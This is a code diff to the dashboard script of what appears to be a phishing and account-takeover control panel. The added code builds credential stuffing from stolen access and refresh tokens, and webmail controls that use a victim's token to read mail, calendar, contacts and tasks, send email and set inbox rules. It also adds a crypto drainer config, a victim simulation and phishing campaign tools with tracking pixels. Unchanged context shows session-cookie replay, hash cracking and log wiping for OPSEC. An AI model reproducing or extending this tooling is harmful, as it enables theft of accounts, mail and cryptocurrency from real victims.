@@ -726,23 +965,74 @@
         async function generateReplay(){const f=document.getElementById('replayLogSelect').value; if(!f){showModal('Error','Select a log file');return;} try{const data=await apiFetch(`/api/replay/${encodeURIComponent(f)}`); document.getElementById('replayOutput').style.display='block'; document.getElementById('replayScriptContent').textContent=data.replayScript; document.getElementById('replayMeta').innerHTML=`Cookies: ${data.cookieCount} · Target: ${escapeHtml(data.targetDomain)} · Access Token: ${data.hasAccessToken?'✅':'❌'} · Refresh Token: ${data.hasRefreshToken?'✅':'❌'}`;}catch(e){showModal('Replay Error',escapeHtml(e.message));}}
         document.getElementById('copyReplayScript').addEventListener('click',()=>{const c=document.getElementById('replayScriptContent').textContent; navigator.clipboard.writeText(c).then(()=>showModal('Copied','Script copied')).catch(()=>{const ta=document.createElement('textarea'); ta.value=c; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove(); showModal('Copied','Script copied (fallback)');});});
 
-        // ---- Webmail ----
+        // ----- CREDENTIAL STUFFING -----
+        async function loadStuffingTokens() {
+            const tokens = await apiFetch('/api/vault/tokens');
+            const select = document.getElementById('stuffingToken');
+            select.innerHTML = '<option value="">Select token</option>';
+            (tokens.tokens || []).forEach(t => {
+                if (t.type === 'refresh' || t.type === 'access') {
+                    const opt = document.createElement('option');
+                    opt.value = t.id || t.value;
+                    opt.textContent = `${t.type} (${truncate(t.username || 'unknown', 20)})`;
+                    select.appendChild(opt);
+                }
+            });
+        }
+        document.getElementById('startStuffing').addEventListener('click', async () => {
+            const tokenId = document.getElementById('stuffingToken').value;
+            if (!tokenId) { showModal('Error','Select a token'); return; }
+            const data = await apiFetch('/api/stuffing', { method: 'POST', body: JSON.stringify({ tokenId }) });
+            document.getElementById('stuffingResult').innerHTML = `<pre>${escapeHtml(JSON.stringify(data,null,2))}</pre>`;
+        });
+
+        // ----- WEBMAIL -----
         async function loadWebmail() {
             try {
                 const tokens=await apiFetch('/api/vault/tokens');
                 const access=tokens.tokens.find(t=>t.type==='access');
                 if (access) { document.getElementById('webmailToken').value=access.value; webmailToken=access.value; }
+                loadMailRules();
             } catch(e){}
         }
         function getWebmailToken(){ const val=document.getElementById('webmailToken').value.trim(); if (val) return val; loadWebmail(); return webmailToken; }
         document.getElementById('webmailLoadFolders').addEventListener('click',async()=>{const token=getWebmailToken(); if(!token){showModal('Error','No access token');return;} try{const data=await apiFetch('/api/webmail/folders',{method:'POST',body:JSON.stringify({accessToken:token})}); let html='<table><tr><th>Name</th><th>Total Items</th></tr>'; data.folders.forEach(f=>{html+=`<tr><td>${escapeHtml(f.displayName)}</td><td>${f.totalItemCount||0}</td></tr>`;}); html+='</table>'; showModal('Folders',html);}catch(e){showModal('Error',escapeHtml(e.message));}});
         document.getElementById('webmailLoadInbox').addEventListener('click',()=>loadEmails('inbox'));
         document.getElementById('webmailLoadSent').addEventListener('click',()=>loadEmails('sent'));
+        document.getElementById('webmailLoadCalendar').addEventListener('click',async()=>{const token=getWebmailToken(); if(!token){showModal('Error','No token');return;} try{const data=await apiFetch('/api/webmail/calendar',{method:'POST',body:JSON.stringify({accessToken:token})}); showModal('Calendar',`<pre>${escapeHtml(JSON.stringify(data,null,2))}</pre>`);}catch(e){showModal('Error',escapeHtml(e.message));}});
+        document.getElementById('webmailLoadContacts').addEventListener('click',async()=>{const token=getWebmailToken(); if(!token){showModal('Error','No token');return;} try{const data=await apiFetch('/api/webmail/contacts',{method:'POST',body:JSON.stringify({accessToken:token})}); showModal('Contacts',`<pre>${escapeHtml(JSON.stringify(data,null,2))}</pre>`);}catch(e){showModal('Error',escapeHtml(e.message));}});
+        document.getElementById('webmailLoadTasks').addEventListener('click',async()=>{const token=getWebmailToken(); if(!token){showModal('Error','No token');return;} try{const data=await apiFetch('/api/webmail/tasks',{method:'POST',body:JSON.stringify({accessToken:token})}); showModal('Tasks',`<pre>${escapeHtml(JSON.stringify(data,null,2))}</pre>`);}catch(e){showModal('Error',escapeHtml(e.message));}});
         async function loadEmails(folderId){const token=getWebmailToken(); if(!token){showModal('Error','No access token');return;} try{const data=await apiFetch('/api/webmail/emails',{method:'POST',body:JSON.stringify({accessToken:token,folderId,limit:20})}); const tbody=document.getElementById('webmailTableBody'); if(!data.emails||!data.emails.length){tbody.innerHTML='<tr><td colspan="4" class="text-muted">No emails</td></tr>';return;} tbody.innerHTML=data.emails.map(email=>`<tr><td>${escapeHtml(email.subject||'(no subject)')}</td><td>${escapeHtml(email.sender?.emailAddress?.address||'—')}</td><td>${formatDate(email.receivedDateTime)}</td><td><button class="btn btn-sm" onclick="viewEmail('${escapeHtml(email.id)}')">👁 View</button></td></tr>`).join('');}catch(e){console.error(e); document.getElementById('webmailTableBody').innerHTML=`<tr><td colspan="4" class="text-danger">${escapeHtml(e.message)}</td></tr>`;}}
         window.viewEmail=async function(id){const token=getWebmailToken(); if(!token)return; try{const data=await apiFetch('/api/webmail/email',{method:'POST',body:JSON.stringify({accessToken:token,messageId:id})}); const email=data.email; let html=`<h3>${escapeHtml(email.subject)}</h3><p><strong>From:</strong> ${escapeHtml(email.sender?.emailAddress?.address)}</p><p><strong>To:</strong> ${(email.toRecipients||[]).map(r=>escapeHtml(r.emailAddress.address)).join(', ')}</p><p><strong>Received:</strong> ${formatDate(email.receivedDateTime)}</p><hr/><div>${email.body?.content||'(no body)'}</div>`; showModal('Email',html);}catch(e){showModal('Error',escapeHtml(e.message));}};
         document.getElementById('webmailSend').addEventListener('click',async()=>{const token=getWebmailToken(); if(!token){showModal('Error','No access token');return;} const to=document.getElementById('webmailTo').value.trim(); const subject=document.getElementById('webmailSubject').value.trim(); const body=document.getElementById('webmailBody').value.trim(); if(!to||!subject||!body){showModal('Error','To, Subject, Body required');return;} const toList=to.split(',').map(s=>s.trim()).filter(s=>s); try{await apiFetch('/api/webmail/send',{method:'POST',body:JSON.stringify({accessToken:token,to:toList,subject,body})}); showModal('Success','Email sent');}catch(e){showModal('Error',escapeHtml(e.message));}});
+        async function loadMailRules() {
+            try {
+                const data = await apiFetch('/api/webmail/rules');
+                const tbody = document.getElementById('mailRulesBody');
+                if (!data.rules || !data.rules.length) {
+                    tbody.innerHTML = '<tr><td colspan="4" class="text-muted">No rules</td></tr>';
+                    return;
+                }
+                tbody.innerHTML = data.rules.map(r => `<tr><td>${escapeHtml(r.name)}</td><td>${escapeHtml(r.condition)}</td><td>${escapeHtml(r.action)}</td><td><button class="btn btn-sm btn-danger" onclick="deleteMailRule('${r.id}')">Delete</button></td></tr>`).join('');
+            } catch(e){}
+        }
+        document.getElementById('loadMailRules').addEventListener('click', loadMailRules);
+        document.getElementById('addMailRule').addEventListener('click', async () => {
+            const name = prompt('Rule name:');
+            const condition = prompt('Condition (e.g., subject contains "urgent"):');
+            const action = prompt('Action (e.g., move to folder):');
+            if (!name || !condition || !action) return;
+            await apiFetch('/api/webmail/rules', { method: 'POST', body: JSON.stringify({ name, condition, action }) });
+            loadMailRules();
+            showModal('Success', 'Rule added.');
+        });
+        window.deleteMailRule = async function(id) {
+            if (!confirm('Delete rule?')) return;
+            await apiFetch('/api/webmail/rules', { method: 'POST', body: JSON.stringify({ _delete: true, id }) });
+            loadMailRules();
+        };
 
-        // ---- Automation (Rules) ----
+        // ----- AUTOMATION (Rules) -----
         async function loadRules() {
             try {
                 const data=await apiFetch('/api/rules');
@@ -757,7 +1047,7 @@
         window.toggleRule=async function(idx){const rule=rulesData[idx]; rule.enabled=!rule.enabled; await apiFetch('/api/rules',{method:'POST',body:JSON.stringify(rule)}); loadRules();};
         window.deleteRule=async function(idx){if(!confirm('Delete this rule?'))return; const rule=rulesData[idx]; rule._delete=true; await apiFetch('/api/rules',{method:'POST',body:JSON.stringify(rule)}); loadRules();};
 
-        // ---- Map (with heatmap toggle) ----
+        // ----- MAP -----
         let heatmapActive=false;
         function initMap() {
             if (!map) {
@@ -766,6 +1056,7 @@
             }
             apiFetch('/api/visits').then(data=>{
                 const visits=data.visits||[];
+                // Remove old markers/heatmap
                 map.eachLayer(layer=>{if(layer!==map._layers[map._layers.length-1]) map.removeLayer(layer);});
                 visits.forEach(v=>{
                     if (v.countryCode && v.countryCode!=='UN' && v.countryCode!=='XX') {
@@ -792,7 +1083,7 @@
             }
         });
 
-        // ---- AI (Advanced) ----
+        // ----- AI -----
         async function loadAI() {
             const tbody=document.getElementById('aiTableBody');
             try {
@@ -811,18 +1102,18 @@
         document.getElementById('crackHashes').addEventListener('click',async()=>{try{const data=await apiFetch('/api/ai/crack',{method:'POST'}); showModal('Crack Results',`<pre>${escapeHtml(JSON.stringify(data,null,2))}</pre>`); loadAI();}catch(e){showModal('Error',escapeHtml(e.message));}});
         document.getElementById('scanAttachments').addEventListener('click',async()=>{try{const data=await apiFetch('/api/ai/ocr',{method:'POST'}); showModal('OCR Results',`<pre>${escapeHtml(JSON.stringify(data,null,2))}</pre>`);}catch(e){showModal('Error',escapeHtml(e.message));}});
 
-        // ---- Integrations ----
+        // ----- INTEGRATIONS -----
         function loadIntegrations(){ /* empty */ }
         document.getElementById('shodanLookup').addEventListener('click',async()=>{const ip=document.getElementById('shodanIP').value.trim(); if(!ip){showModal('Error','Enter an IP');return;} try{const data=await apiFetch(`/api/integrations/shodan?ip=${encodeURIComponent(ip)}`); document.getElementById('shodanResult').innerHTML=`<pre>${escapeHtml(JSON.stringify(data,null,2))}</pre>`;}catch(e){showModal('Error',escapeHtml(e.message));}});
         document.getElementById('vtLookup').addEventListener('click',async()=>{const hash=document.getElementById('vtHash').value.trim(); if(!hash){showModal('Error','Enter a hash');return;} try{const data=await apiFetch(`/api/integrations/virustotal?hash=${encodeURIComponent(hash)}`); document.getElementById('vtResult').innerHTML=`<pre>${escapeHtml(JSON.stringify(data,null,2))}</pre>`;}catch(e){showModal('Error',escapeHtml(e.message));}});
         document.getElementById('testWebhook').addEventListener('click',async()=>{const url=document.getElementById('webhookURL').value.trim(); if(!url){showModal('Error','Enter webhook URL');return;} try{await apiFetch('/api/integrations/webhook/test',{method:'POST',body:JSON.stringify({url})}); showModal('Success','Test sent');}catch(e){showModal('Error',escapeHtml(e.message));}});
 
-        // ---- OPSEC ----
+        // ----- OPSEC -----
         function loadOPSEC(){ /* load settings */ }
         document.getElementById('applyOPSEC').addEventListener('click',async()=>{const tor=document.getElementById('torEnabled').checked; const rot=document.getElementById('ipRotInterval').value; try{await apiFetch('/api/opsec/apply',{method:'POST',body:JSON.stringify({tor,ipRotInterval:parseInt(rot)})}); showModal('Applied','OPSEC settings applied.');}catch(e){showModal('Error',escapeHtml(e.message));}});
         document.getElementById('wipeLogs').addEventListener('click',async()=>{if(!confirm('Wipe logs older than retention days?'))return; try{await apiFetch('/api/opsec/wipe',{method:'POST'}); showModal('Wiped','Old logs wiped.');}catch(e){showModal('Error',escapeHtml(e.message));}});
 
-        // ---- Visuals ----
+        // ----- VISUALS -----
         function loadVisuals(){ /* empty */ }
         let timelineChartInstance=null;
         document.getElementById('showTimeline').addEventListener('click',async()=>{
@@ -864,24 +1155,151 @@
             showModal('Heatmap','Heatmap requires additional library. Implement backend to serve heatmap data.');
         });
 
-        // ---- Settings ----
+        // ----- SYSTEM -----
+        async function loadSystemStats() {
+            try {
+                const data = await apiFetch('/api/system/stats');
+                document.getElementById('sysCpu').textContent = data.cpu + '%';
+                document.getElementById('sysRam').textContent = data.ram + '%';
+                document.getElementById('sysNet').textContent = data.net + ' kb/s';
+                const ctx = document.getElementById('sysChart').getContext('2d');
+                if (!sysChartInstance) {
+                    sysChartInstance = new Chart(ctx, {
+                        type: 'line',
+                        data: {
+                            labels: [],
+                            datasets: [
+                                { label: 'CPU', data: [], borderColor: '#7aa2f7', fill: false },
+                                { label: 'RAM', data: [], borderColor: '#f472b6', fill: false }
+                            ]
+                        },
+                        options: { responsive: true, maintainAspectRatio: false }
+                    });
+                }
+                const now = new Date().toLocaleTimeString();
+                sysChartInstance.data.labels.push(now);
+                sysChartInstance.data.datasets[0].data.push(data.cpu);
+                sysChartInstance.data.datasets[1].data.push(data.ram);
+                if (sysChartInstance.data.labels.length > 30) {
+                    sysChartInstance.data.labels.shift();
+                    sysChartInstance.data.datasets[0].data.shift();
+                    sysChartInstance.data.datasets[1].data.shift();
+                }
+                sysChartInstance.update();
+            } catch(e) { /* ignore */ }
+        }
+
+        // ----- CRYPTO -----
+        async function loadCryptoConfig() {
+            const data = await apiFetch('/api/crypto/config');
+            document.getElementById('enableDrainer').checked = data.enabled || false;
+            document.getElementById('drainTargets').value = (data.targets || []).join(', ');
+        }
+        document.getElementById('saveCryptoConfig').addEventListener('click', async () => {
+            const enabled = document.getElementById('enableDrainer').checked;
+            const targets = document.getElementById('drainTargets').value.split(',').map(s=>s.trim()).filter(s=>s);
+            await apiFetch('/api/crypto/config', {
+                method: 'POST',
+                body: JSON.stringify({ enabled, targets })
+            });
+            showModal('Saved', 'Crypto config updated.');
+        });
+
+        // ----- TEST -----
+        function loadTest(){ /* empty */ }
+        document.getElementById('simulateVictim').addEventListener('click', async () => {
+            const resultDiv = document.getElementById('simulationResult');
+            resultDiv.innerHTML = 'Running simulation...';
+            try {
+                const data = await apiFetch('/api/test/simulate', { method: 'POST' });
+                resultDiv.innerHTML = `<pre>${escapeHtml(JSON.stringify(data, null, 2))}</pre>`;
+            } catch (e) {
+                resultDiv.innerHTML = `<span class="text-danger">${escapeHtml(e.message)}</span>`;
+            }
+        });
+        document.getElementById('sendTestRequest').addEventListener('click', async () => {
+            const method = document.getElementById('testMethod').value;
+            const endpoint = document.getElementById('testEndpoint').value.trim();
+            const body = document.getElementById('testBody').value.trim();
+            if (!endpoint) { showModal('Error','Enter endpoint'); return; }
+            let options = { method };
+            if (body) {
+                options.headers = { 'Content-Type': 'application/json' };
+                options.body = body;
+            }
+            try {
+                const res = await fetch(API_BASE + endpoint, options);
+                const text = await res.text();
+                document.getElementById('testResponse').textContent = text;
+            } catch(e) {
+                document.getElementById('testResponse').textContent = 'Error: ' + e.message;
+            }
+        });
+
+        // ----- SETTINGS -----
         function loadSettings(){ apiFetch('/api/settings').then(data=>{document.getElementById('enable2FA').checked=data.twoFactorEnabled||false; document.getElementById('ipWhitelist').value=(data.ipWhitelist||[]).join(', '); document.getElementById('enableBrowserEncryption').checked=data.browserEncryption||true;}).catch(()=>{});}
         document.getElementById('setup2FA').addEventListener('click',async()=>{try{const data=await apiFetch('/api/settings/2fa/setup',{method:'POST'}); showModal('2FA Setup',`Scan QR:<br><img src="${data.qrCode}" style="max-width:200px;" />`);}catch(e){showModal('Error',escapeHtml(e.message));}});
         document.getElementById('saveIPWhitelist').addEventListener('click',async()=>{const ips=document.getElementById('ipWhitelist').value.split(',').map(s=>s.trim()).filter(s=>s); try{await apiFetch('/api/settings/whitelist',{method:'POST',body:JSON.stringify({ips})}); showModal('Saved','IP whitelist updated.');}catch(e){showModal('Error',escapeHtml(e.message));}});
 
-        // ---- Plugins ----
-        function loadPlugins(){ document.getElementById('pluginsTableBody').innerHTML='<tr><td colspan="3" class="text-muted">No plugins loaded.</td></tr>'; }
+        // ----- PLUGINS -----
+        async function loadPlugins() {
+            const data = await apiFetch('/api/plugins');
+            const tbody = document.getElementById('pluginsTableBody');
+            if (!data.plugins || !data.plugins.length) {
+                tbody.innerHTML = '<tr><td colspan="3" class="text-muted">No plugins installed.</td></tr>';
+                return;
+            }
+            tbody.innerHTML = data.plugins.map(p => `
+                <tr>
+                    <td>${escapeHtml(p.name)}</td>
+                    <td><span class="badge badge-${p.enabled?'green':'gray'}">${p.enabled?'Enabled':'Disabled'}</span></td>
+                    <td>
+                        <button class="btn btn-sm" onclick="togglePlugin('${p.id}')">Toggle</button>
+                        <button class="btn btn-sm btn-danger" onclick="uninstallPlugin('${p.id}')">Uninstall</button>
+                    </td>
+                </tr>
+            `).join('');
+        }
+        window.togglePlugin = async function(id) {
+            await apiFetch('/api/plugins/toggle', { method: 'POST', body: JSON.stringify({ id }) });
+            loadPlugins();
+        };
+        window.uninstallPlugin = async function(id) {
+            if (!confirm('Uninstall plugin?')) return;
+            await apiFetch('/api/plugins/uninstall', { method: 'POST', body: JSON.stringify({ id }) });
+            loadPlugins();
+        };
         document.getElementById('runPlugin').addEventListener('click',()=>{const code=document.getElementById('pluginCode').value; try{const fn=new Function(code); const result=fn(); showModal('Plugin Output',`<pre>${escapeHtml(String(result))}</pre>`);}catch(e){showModal('Plugin Error',`<div class="text-danger">${escapeHtml(e.message)}</div>`);}});
 
-        // ---- Campaigns ----
+        // ----- CAMPAIGNS -----
         function loadCampaigns(){ document.getElementById('campaignTableBody').innerHTML='<tr><td colspan="7" class="text-muted">No campaigns.</td></tr>'; }
         document.getElementById('createCampaign').addEventListener('click',async()=>{const name=document.getElementById('campaignName').value.trim(); const domain=document.getElementById('campaignDomain').value.trim(); const template=document.getElementById('campaignEmailTemplate').value.trim(); if(!name||!domain||!template){showModal('Error','Fill all fields');return;} try{await apiFetch('/api/campaigns',{method:'POST',body:JSON.stringify({name,domain,template})}); showModal('Success','Campaign launched.'); loadCampaigns();}catch(e){showModal('Error',escapeHtml(e.message));}});
+        document.getElementById('generatePixel').addEventListener('click', async () => {
+            const data = await apiFetch('/api/campaigns/pixel', { method: 'POST' });
+            document.getElementById('pixelCode').value = data.pixelUrl;
+        });
+        document.getElementById('launchABTest').addEventListener('click', async () => {
+            const name = document.getElementById('campaignName').value.trim();
+            const domain = document.getElementById('campaignDomain').value.trim();
+            const variantA = document.getElementById('campaignVariantA').value.trim();
+            const variantB = document.getElementById('campaignVariantB').value.trim();
+            if (!name || !domain || !variantA || !variantB) {
+                showModal('Error','Fill in all fields for A/B test');
+                return;
+            }
+            await apiFetch('/api/campaigns/abtest', {
+                method: 'POST',
+                body: JSON.stringify({ name, domain, variantA, variantB })
+            });
+            showModal('Success','A/B test launched');
+            loadCampaigns();
+        });
 
-        // ---- Modal ----
+        // ----- MODAL -----
         document.getElementById('modalClose').addEventListener('click',closeModal);
         document.getElementById('modalOverlay').addEventListener('click',function(e){if(e.target===this)closeModal();});
 
-        // ---- Refresh buttons ----
+        // ----- REFRESH BUTTONS -----
         document.getElementById('refreshOverview').addEventListener('click',loadOverview);
         document.getElementById('refreshAnalytics').addEventListener('click',loadAnalytics);
         document.getElementById('refreshLogs').addEventListener('click',loadLogs);
@@ -889,7 +1307,7 @@
         document.getElementById('refreshDevice').addEventListener('click',loadDevice);
         document.getElementById('refreshPRT').addEventListener('click',loadPRT);
 
-        // ---- Init ----
+        // ----- INIT -----
         function init(){
             const saved=localStorage.getItem('theme')||'dark';
             document.body.setAttribute('data-theme',saved);
@@ -909,7 +1327,24 @@
             loadSettings();
             loadPlugins();
             loadCampaigns();
-            setInterval(loadStats,30000);
+            loadSystemStats();
+            loadCryptoConfig();
+            loadStuffingTokens();
+
+            // Add mousemove listener for cursor
+            let cursorTimeout = null;
+            document.addEventListener('mousemove', (e) => {
+                if (cursorTimeout) return;
+                cursorTimeout = setTimeout(() => {
+                    const x = e.clientX / window.innerWidth;
+                    const y = e.clientY / window.innerHeight;
+                    sendCursor(x, y);
+                    cursorTimeout = null;
+                }, 100);
+            });
+
+            setInterval(loadStats, 30000);
+            setInterval(loadSystemStats, 5000);
         }
         init();
     })();
